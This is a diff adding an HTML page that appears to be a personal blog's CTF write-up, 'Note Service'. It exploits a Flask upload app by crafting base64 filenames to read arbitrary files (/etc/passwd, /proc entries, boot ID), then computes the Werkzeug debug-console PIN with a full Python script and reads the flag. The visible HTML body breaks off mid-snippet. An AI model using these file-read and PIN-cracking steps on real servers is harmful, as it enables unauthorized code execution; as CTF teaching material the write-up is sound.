@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="UTF-8">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge"><meta name="robots" content="index, follow"><meta name="author" content="Gabriel Yip">
+<meta name="description" content="Continuing Hermit&#39;s legacy to be minimal and fast theme">
+<link rel="author" type="text/plain" href="/humans.txt">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<meta name="msapplication-TileImage" content="/mstile-144x144.png">
+<meta name="theme-color" content="#494f5c">
+<meta name="msapplication-TileColor" content="#494f5c">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#494f5c">
+
+  <meta itemprop="name" content="Note Service">
+  <meta itemprop="description" content="Note-Service 🫣 Observation We see a very simple flask website with upload and download function. When you upload a file on the website, it will save the file and change the title as the base64 of the first 50 bytes. Meaning if I uploaded a file named abc.txt with content abcdefg, the file will be saved as YWJjZGVmZw== as the tite, with the content as abcdefg.">
+  <meta itemprop="datePublished" content="2025-06-10T20:33:57+10:00">
+  <meta itemprop="dateModified" content="2025-06-10T20:33:57+10:00">
+  <meta itemprop="wordCount" content="1027">
+  <meta itemprop="keywords" content="Untagged"><meta property="og:url" content="http://localhost:1313/en/posts/rcr-writeup/note-service/">
+  <meta property="og:site_name" content="Gabriel Yip">
+  <meta property="og:title" content="Note Service">
+  <meta property="og:description" content="Note-Service 🫣 Observation We see a very simple flask website with upload and download function. When you upload a file on the website, it will save the file and change the title as the base64 of the first 50 bytes. Meaning if I uploaded a file named abc.txt with content abcdefg, the file will be saved as YWJjZGVmZw== as the tite, with the content as abcdefg.">
+  <meta property="og:locale" content="en_US">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-06-10T20:33:57+10:00">
+    <meta property="article:modified_time" content="2025-06-10T20:33:57+10:00">
+    <meta property="article:tag" content="Untagged">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Note Service">
+  <meta name="twitter:description" content="Note-Service 🫣 Observation We see a very simple flask website with upload and download function. When you upload a file on the website, it will save the file and change the title as the base64 of the first 50 bytes. Meaning if I uploaded a file named abc.txt with content abcdefg, the file will be saved as YWJjZGVmZw== as the tite, with the content as abcdefg.">
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Note Service",
+    "name": "Note Service",
+    "description": "Note-Service 🫣 Observation We see a very simple flask website with upload and download function. When you upload a file on the website, it will save the file and change the title as the base64 of the first 50 bytes. Meaning if I uploaded a file named abc.txt with content abcdefg, the file will be saved as YWJjZGVmZw== as the tite, with the content as abcdefg.\n",
+    "keywords": ["untagged"],
+    "articleBody": "Note-Service 🫣 Observation We see a very simple flask website with upload and download function. When you upload a file on the website, it will save the file and change the title as the base64 of the first 50 bytes. Meaning if I uploaded a file named abc.txt with content abcdefg, the file will be saved as YWJjZGVmZw== as the tite, with the content as abcdefg.\nObservation 1: If the file is not uploaded before, you cannot retrieve the file. Also, if the file already existed on the server, the file would not be uploaded and the original file will be retained in the server. For example, if a file named flag.txt is already on the server, retrieving flag.txt will return an error as the file was not uploaded.\nBut why does these matter? Let’s check out a snippet of the backend for the upload file and see where the vulnerability lies,\n@app.route(\"/\", methods=[\"GET\", \"POST\"]) #11 def index(): #12 if request.method == \"POST\": #13 print(request.files) #14 note_content = request.files[\"note\"].stream.read() #15 note_title = b64encode(note_content[:50]).decode() #16 uploaded_files.add(note_title) #17 print(note_title) #18 print(note_content) #19 flash(\"Your file has been successfully uploaded!\", \"success\") #20 if os.path.exists(note_title): #21 flash(f\"The file {note_title} already exists!\", \"danger\") #22 else: #23 open(note_title, \"wb\").write(note_content) #24 flash(f\"Your file has been written to! It has been saved with the title: {note_title}\", \"success\") #25 Notice Line #17? An array uploaded_files appends the title no matter if the file existed already on the server or not! Meaning even if a file already existed on the server before, it will not replace the file with the one you uploaded. However you can retrieve the file originally on the server.\nObservation 2: VERY IMPORTANT! Flask debug is on! and https:///console is out in the public!!! If you manage to cause an error (Just try to retrieve an empty file), you will get a snippet of the source code around the line the error was thrown. Most importantly, the path the backend server is in the error logs! From this, you will know the python script is located at /a/very/strange/working/directory/server.py! (sus!)\n🧠 Think process With all those observations, An idea comes to my mind. Could we access ANY files other than the uploaded one? The answer is YES! (With a few exceptions). If we want to retrieve /etc/passwd, how would we do it?\nFirst, we would need to add /etc/passwd in the array uploaded_files.\nCheck out this snippet of the server.py code:\nnote_title = b64encode(note_content[:50]).decode() #16 uploaded_files.add(note_title) #17 What we want is a string, AFTER it being base64 encoded, it becomes /etc/passwd. Easy enough, right? We just need to run b64decode(b'/etc/passwd') in python and that’s it!\nBUT this would produce an error. Specifically binascii.Error: Incorrect padding. For it to a valid base64 string, its length must be an increment of 4 and every character has to be A-Z, a-z, 0-9, + or /. We need to somehow turn this path (/etc/passwd) lengthed 11 now to a length 12 path. Easy enough! We just add a / in front, making the path //etc/passwd. This would let us access the file while fitting the criteria for a vaid base64 string.\n\u003e\u003e\u003e payload = b64decode(b'//etc/passwd') \u003e\u003e\u003e print(payload) b'\\xff\\xf7\\xads\\xfaZ\\xb2\\xcc\\x1d' \u003e\u003e\u003e with open(\"input.bin\", \"wb\") as f: ... f.write(payload) Nice! Upload input.bin and it will show the file already existed! But since //etc/passwd is in the uploaded_files array, we could access //etc/passwd and see the content of file!\n« PHOTO OF PASSWD »\nThis means as long as the filepath is valid base64 string, we could access it! Nice! Let’s try to retrieve flag.txt then!\nNOPE! Since flag.txt has a . in the title, it is an invalid base64 string. Not that easy huh… damn it!\nSolution I stumble on this article about Werkzeug Console PIN Exploit. tldr you need these variables to get the console PIN:\nprobably_public_bits = [ username, modname, getattr(app, '__name__', getattr(app.__class__, '__name__')), getattr(mod, '__file__', None), ] private_bits = [ str(uuid.getnode()), get_machine_id(), ] For more info check the article here.\nUsing similar process above, I was able to retrieve the following files:\nContents of //etc/passwd:\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin jacobi:x:100:65534::/nonexistent:/usr/sbin/nologin Contents of ////proc/net/arp:\nIP address HW type Flags HW address Mask Device 172.17.0.1 0x1 0x2 d6:d4:b8:80:74:e6 * eth0 Contents of //sys/class/net/eth0/address:\n6a:0a:ec:e5:6c:45 Contents of ///proc/self/cmdline:\n/usr/local/bin/python server.py --boot_id_file ./bootid Contents of /a/very/strange/working/directory/bootid:\n290a0861-7055-4ec3-9916-cdb1f7e47fcc Contents of ////proc/self/cgroup:\n0::/ After retrieving all these files, we can finally piece everything together and generate the PIN for the console! Using this python script:\nimport hashlib import itertools from itertools import chain def crack_md5(username, modname, appname, flaskapp_path, node_uuid, machine_id): h = hashlib.md5() crack(h, username, modname, appname, flaskapp_path, node_uuid, machine_id) def crack_sha1(username, modname, appname, flaskapp_path, node_uuid, machine_id): h = hashlib.sha1() crack(h, username, modname, appname, flaskapp_path, node_uuid, machine_id) def crack(hasher, username, modname, appname, flaskapp_path, node_uuid, machine_id): probably_public_bits = [ username, modname, appname, flaskapp_path ] private_bits = [ node_uuid, machine_id ] h = hasher for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) if __name__ == '__main__': usernames = ['jacobi'] modnames = ['flask.app', 'werkzeug.debug'] appnames = ['wsgi_app', 'DebuggedApplication', 'Flask'] flaskpaths = ['/usr/local/lib/python3.13/site-packages/flask/app.py'] nodeuuids = ['116595156675653'] machineids = ['290a0861-7055-4ec3-9916-cdb1f7e47fcc'] # Generate all possible combinations of values combinations = itertools.product(usernames, modnames, appnames, flaskpaths, nodeuuids, machineids) # Iterate over the combinations and call the crack() function for each one for combo in combinations: username, modname, appname, flaskpath, nodeuuid, machineid = combo print('==========================================================================') crack_sha1(username, modname, appname, flaskpath, nodeuuid, machineid) print(f'{combo}') print('==========================================================================') The first generated pin is\n========================================================================== 684-847-740 ('jacobi', 'flask.app', 'wsgi_app', '/usr/local/lib/python3.13/site-packages/flask/app.py', '116595156675653', '290a0861-7055-4ec3-9916-cdb1f7e47fcc') ========================================================================== and if you enter it in the pin prompt, IT WORKS!! OMG! We just need to retrieve le flag. Inside the debug console, We enter this:\n\u003e\u003e\u003e print(open('flag.txt', 'r').read()) RCR{rC3_Just_t0_ReaD_4_fiL3?} Other useful resource for Werkzeug Console PIN Exploit: DANGEROUS Python Flask Debug Mode Vulnerabilities - John Hammond ",
+    "wordCount" : "1027",
+    "inLanguage": "en",
+    "datePublished": "2025-06-10T20:33:57+10:00",
+    "dateModified": "2025-06-10T20:33:57+10:00",
+    "author":{
+        "@type": "Person",
+        "name": "Gabriel Yip",
+        "url": "http://localhost:1313/en/about-me/"
+        },
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http://localhost:1313/en/posts/rcr-writeup/note-service/"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "Gabriel Yip",
+      "description": "Continuing Hermit's legacy to be minimal and fast theme",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "http://localhost:1313/favicon.ico"
+      }
+    }
+}
+</script><title>Note Service</title>
+<link rel="stylesheet dns-prefetch preconnect preload prefetch" as="style" media="screen" href="http://localhost:1313/css/style.min.4c5e8423515d918bf1d2d387114ff3dbd452a519e6e766b34a285d37a5edf85f.css" integrity="sha256-TF6EI1FdkYvx0tOHEU/z29RSpRnm52azSihdN6Xt+F8=" crossorigin="anonymous">
+	</head>
+<body id="page">
+	<header id="site-header">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="http://localhost:1313/">Gabriel Yip</a>
+				</div>
+				<nav class="site-nav hide-in-mobile"><a href="http://localhost:1313/en/posts/">Posts</a><a href="http://localhost:1313/en/projects/">Projects</a><a href="http://localhost:1313/en/about-me/">About Me</a></nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<span class="hdr-links hide-in-mobile"><a href="https://github.com/6plosive" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
+   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+   <path
+      d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+   </path>
+</svg></a><a href="https://www.linkedin.com/in/yip-gabriel/" target="_blank" rel="noopener me" title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
+   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+   <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+   <rect x="2" y="9" width="4" height="12"></rect>
+   <circle cx="4" cy="4" r="2"></circle>
+</svg></a></span><button id="share-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-share-2">
+      <circle cx="18" cy="5" r="3"></circle>
+      <circle cx="6" cy="12" r="3"></circle>
+      <circle cx="18" cy="19" r="3"></circle>
+      <line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line>
+      <line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line>
+   </svg></button>
+ 
+<div id="share-links" class="animated fast">
+    
+    
+    
+    
+    <ul>
+        <li>
+            <a href="https://twitter.com/intent/tweet?hashtags=hermit2&amp;url=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2frcr-writeup%2fnote-service%2f&amp;text=Note%20Service" target="_blank" rel="noopener" aria-label="Share on X"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
+   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+   <path class="st0" d="m21.3 21.1 -11.4 -18.2h-7.2l11.4 18.2zm-18.6 0 7.2 -6.6m4.2 -5 7.2 -6.6" />
+</svg></a>
+        </li>
+        <li>
+            <a href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2frcr-writeup%2fnote-service%2f" target="_blank" rel="noopener" aria-label="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
+   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+   <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
+</svg></a>
+        </li>
+        <li>
+            <a href="mailto:?subject=Note%20Service&amp;body=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2frcr-writeup%2fnote-service%2f" target="_self" rel="noopener" aria-label="Share on Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
+   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+   <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+   <polyline points="22,6 12,13 2,6"></polyline>
+</svg></a>
+        </li>
+        <li>
+            <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2frcr-writeup%2fnote-service%2f&amp;source=http%3a%2f%2flocalhost%3a1313%2f&amp;title=Note%20Service&amp;summary=Note%20Service%2c%20by%20Gabriel%20Yip%0a%0a%3cnil%3e%0a" target="_blank" rel="noopener" aria-label="Share on LinkedIn"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
+   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+   <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+   <rect x="2" y="9" width="4" height="12"></rect>
+   <circle cx="4" cy="4" r="2"></circle>
+</svg></a>
+        </li>
+        <li>
+            <a href="#" onclick="linkShare(&#34;Note Service&#34;,&#34;http://localhost:1313/en/posts/rcr-writeup/note-service/&#34;,&#34;Note Service, by Gabriel Yip\n\n\u003cnil\u003e\n&#34;); return false;" target="_self" rel="noopener" aria-label="Copy Link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+   </svg></a>
+        </li>
+    </ul>
+</div><button id="menu-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+   </svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="http://localhost:1313/en/posts/">Posts</a></li>
+			<li><a href="http://localhost:1313/en/projects/">Projects</a></li>
+			<li><a href="http://localhost:1313/en/about-me/">About Me</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner animated fadeIn faster"><article class="thin">
+			<header class="post-header">
+				<div class="post-date"><span>Jun 10, 2025</span></div>
+				<h1>Note Service</h1>
+			</header>
+			<div class="post-description"><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+   stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-feather">
+   <path d="M20.24 12.24a6 6 0 0 0-8.49-8.49L5 10.5V19h8.5z"></path>
+   <line x1="16" y1="8" x2="2" y2="22"></line>
+   <line x1="17.5" y1="15" x2="9" y2="15"></line>
+</svg><a href="http://localhost:1313/en/about-me/" target="_blank">Gabriel Yip</a></p>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon">
+      <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path>
+      <line x1="7" y1="7" x2="7" y2="7"></line>
+   </svg><span class="tag"><a href="http://localhost:1313/en/tags/untagged">untagged</a></span></p>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+      <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+      <polyline points="14 2 14 8 20 8"></polyline>
+      <line x1="16" y1="13" x2="8" y2="13"></line>
+      <line x1="16" y1="17" x2="8" y2="17"></line>
+      <polyline points="10 9 9 9 8 9"></polyline>
+   </svg>1027&nbsp  … ⏲ Reading Time:4 Minutes, 40 Seconds</p>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+      <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+      <line x1="16" y1="2" x2="16" y2="6"></line>
+      <line x1="8" y1="2" x2="8" y2="6"></line>
+      <line x1="3" y1="10" x2="21" y2="10"></line>
+   </svg>2025-06-10 20:33 &#43;1000
+</p></div>
+			<hr class="post-end">
+			<div class="content">
+				 <h2 id="note-service">Note-Service<a href="#note-service" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h2>
+<h3 id="-observation">🫣 Observation<a href="#-observation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h3>
+<p>We see a very simple flask website with upload and download function. When you upload a file on the website, it will save the file and change the title as the base64 of the first 50 bytes. Meaning if I uploaded a file named <code>abc.txt</code> with content <code>abcdefg</code>, the file will be saved as <code>YWJjZGVmZw==</code> as the tite, with the content as <code>abcdefg</code>.</p>
+<p>Observation 1: If the file is not uploaded before, you cannot retrieve the file. Also, if the file already existed on the server, the file would not be uploaded and the original file will be retained in the server. For example, if a file named <code>flag.txt</code> is already on the server, retrieving <code>flag.txt</code> will return an error as the file was not uploaded.</p>
+<p>But why does these matter? Let&rsquo;s check out a snippet of the backend for the upload file and see where the vulnerability lies,</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>]) <span style="color:#75715e">#11</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>(): <span style="color:#75715e">#12</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>: <span style="color:#75715e">#13</span>
+</span></span><span style="display:flex;"><span>        print(request<span style="color:#f92672">.</span>files) <span style="color:#75715e">#14</span>
+</span></span><span style="display:flex;"><span>        note_content <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#34;note&#34;</span>]<span style="color:#f92672">.</span>stream<span style="color:#f92672">.</span>read() <span style="color:#75715e">#15</span>
+</span></span><span style="display:flex;"><span>        note_title <span style="color:#f92672">=</span> b64encode(note_content[:<span style="color:#ae81ff">50</span>])<span style="color:#f92672">.</span>decode() <span style="color:#75715e">#16</span>
+</span></span><span style="display:flex;"><span>        uploaded_files<span style="color:#f92672">.</span>add(note_title) <span style="color:#75715e">#17</span>
+</span></span><span style="display:flex;"><span>        print(note_title) <span style="color:#75715e">#18</span>
+</span></span><span style="display:flex;"><span>        print(note_content) <span style="color:#75715e">#19</span>
+</span></span><span style="display:flex;"><span>        flash(<span style="color:#e6db74">&#34;Your file has been successfully uploaded!&#34;</span>, <span style="color:#e6db74">&#34;success&#34;</span>) <span style="color:#75715e">#20</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(note_title): <span style="color:#75715e">#21</span>
+</span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;The file </span><span style="color:#e6db74">{</span>note_title<span style="color:#e6db74">}</span><span style="color:#e6db74"> already exists!&#34;</span>, <span style="color:#e6db74">&#34;danger&#34;</span>) <span style="color:#75715e">#22</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>: <span style="color:#75715e">#23</span>
+</span></span><span style="display:flex;"><span>            open(note_title, <span style="color:#e6db74">&#34;wb&#34;</span>)<span style="color:#f92672">.</span>write(note_content) <span style="color:#75715e">#24</span>
+</span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Your file has been written to! It has been saved with the title: </span><span style="color:#e6db74">{</span>note_title<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;success&#34;</span>) <span style="color:#75715e">#25</span>
+</span></span></code></pre></div><p>Notice Line #17? An array <code>uploaded_files</code> appends the title no matter if the file existed already on the server or not! Meaning even if a file already existed on the server before, it will not replace the file with the one you uploaded. However you can retrieve the file originally on the server.</p>
+<p>Observation 2: VERY IMPORTANT! Flask debug is on! and https://&lt;some.coolurl.com&gt;/console is out in the public!!! If you manage to cause an error (Just try to retrieve an empty file), you will get a snippet of the source code around the line the error was thrown. Most importantly, the path the backend server is in the error logs! From this, you will know the python script is located at <code>/a/very/strange/working/directory/server.py</code>! (sus!)</p>
+<h3 id="-think-process">🧠 Think process<a href="#-think-process" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h3>
+<p>With all those observations, An idea comes to my mind. Could we access ANY files other than the uploaded one? The answer is YES! (With a few exceptions). If we want to retrieve <code>/etc/passwd</code>, how would we do it?</p>
+<p>First, we would need to add <code>/etc/passwd</code> in the array <code>uploaded_files</code>.</p>
+<p>Check out this snippet of the server.py code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>        note_title <span style="color:#f92672">=</span> b64encode(note_content[:<span style="color:#ae81ff">50</span>])<span style="color:#f92672">.</span>decode() <span style="color:#75715e">#16</span>
+</span></span><span style="display:flex;"><span>        uploaded_files<span style="color:#f92672">.</span>add(note_title) <span style="color:#75715e">#17</span>
+</span></span></code></pre></div><p>What we want is a string, AFTER it being base64 encoded, it becomes <code>/etc/passwd</code>. Easy enough, right? We just need to run <code>b64decode(b'/etc/passwd')</code> in python and that&rsquo;s it!</p>
+<p>BUT this would produce an error. Specifically <code>binascii.Error: Incorrect padding</code>. For it to a valid base64 string, its length must be an increment of 4 and every character has to be <code>A-Z, a-z, 0-9, + or /</code>. We need to somehow turn this path (<code>/etc/passwd</code>) lengthed 11 now to a length 12 path. Easy enough! We just add a <code>/</code> in front, making the path <code>//etc/passwd</code>. This would let us access the file while fitting the criteria for a vaid base64 string.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> payload <span style="color:#f92672">=</span> b64decode(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;//etc/passwd&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> print(payload)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff\xf7\xad</span><span style="color:#e6db74">s</span><span style="color:#ae81ff">\xfa</span><span style="color:#e6db74">Z</span><span style="color:#ae81ff">\xb2\xcc\x1d</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;input.bin&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>     f<span style="color:#f92672">.</span>write(payload)
+</span></span></code></pre></div><p>Nice! Upload <code>input.bin</code> and it will show the file already existed! But since <code>//etc/passwd</code> is in the <code>uploaded_files</code> array, we could access <code>//etc/passwd</code> and see the content of file!</p>
+<p>&laquo; PHOTO OF PASSWD &raquo;</p>
+<p>This means as long as the filepath is valid base64 string, we could access it! Nice! Let&rsquo;s try to retrieve <code>flag.txt</code> then!</p>
+<p>NOPE! Since <code>flag.txt</code> has a <code>.</code> in the title, it is an invalid base64 string. Not that easy huh&hellip; damn it!</p>
+<h3 id="solution">Solution<a href="#solution" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h3>
+<p>I stumble on this article about <a href="https://www.daehee.com/blog/werkzeug-console-pin-exploit">Werkzeug Console PIN Exploit</a>. tldr you need these variables to get the console PIN:</p>
+<pre tabindex="0"><code>probably_public_bits = [
+    username,
+    modname,
